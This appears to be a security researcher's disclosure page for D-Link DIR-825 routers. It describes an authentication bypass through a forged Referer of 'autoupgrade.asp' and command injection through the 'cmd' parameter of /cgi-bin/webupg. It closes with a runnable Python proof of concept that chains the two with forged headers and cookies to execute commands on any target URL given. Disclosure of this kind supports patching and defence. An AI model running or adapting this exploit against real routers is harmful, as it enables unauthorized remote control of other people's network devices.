# D-Link DIR-825 Unauthorized Remote Command Execution
An authorization command injection vulnerability about DIR-825

</br>**Exploit Author:** KeenSight Lab.Tgp (topsuchow@gmail.com)
</br>**Vender:** D-Link

## /cgi-bin/webupg
**Firmware version:** 
DIR-825(G1): all
</br>......
<br/>**Hardware Link:**https://downloads.d-link.co.za/DIR/dir825%20(new)/firmware/
## 1. Authentication bypasses the vulnerability

In the "webupg" binary, attackers can bypass authentication through parameters "autoupgrade.asp", and perform functions such as downloading configuration files and updating firmware without authorization.

![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20133715.png)

Through the web port, attackers can access "autoupgrade.asp" without authorization.

![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20140001.png)
#### BurpSuite Test

Replace "cgi-bin/webupg" at Referer with "autoupgrade.asp"

![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20134942.png)

![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20135536.png)

## 2. Authorization Remote Command Execution

In the "webupg" binary, because of the lack of parameter verification, attackers can use "cmd" parameters to execute arbitrary system commands after obtaining authorization

`shell`
![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20145714.png)

![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20145811.png)

![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20145901.png)

#### BurpSuite Test

Combine these two vulnerabilities, that attack can realize RCE

![image](https://github.com/tgp-top/D-Link-DIR-825/blob/52e44bda1c3bfd801da59d6a51420b3cad4c64e6/image/2022-01-13%20145991.png)

## POC
<sup> 
  
  
  
    # DIR-825
    # hw:G1
    # fw:7.XX
    import urllib
    import requests
    import linecache
    import sys
    import threading
    from urllib.parse import urlparse
    from concurrent.futures import ThreadPoolExecutor
    import urllib3
    urllib3.disable_warnings()

    def attack(url):
        scheme = urlparse(url).scheme
        hostname = urlparse(url).hostname
        port = urlparse(url).port
        header={
            'Host':hostname+':'+str(port),
            'Origin': url,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Referer': url+'/autoupgrade.asp',
            'Cookie': 'sessionid=ae3aa37; auth=ok; expires=Sun, 15-May-9999 01:45:46 GMT; language=en_us; sys_UserName=admin',
            'Connection': 'close',
        }

        data=urllib.parse.urlencode(
            { 'name': 'shell',
              'cmd': 'ifconfig',
            'key': 'twmode',}, quote_via=urllib.parse.quote)
        urls = url+'/cgi-bin/webupg'
        try:
            ret = requests.post(url=urls,
                          headers=header,
                          data=data,
                          verify=False,
                          allow_redirects=False,
                          timeout=30,
                          )
        except Exception:
            return

    if __name__ == "__main__":
        rhost = sys.argv[1]
        attack(rhost)
</sup>
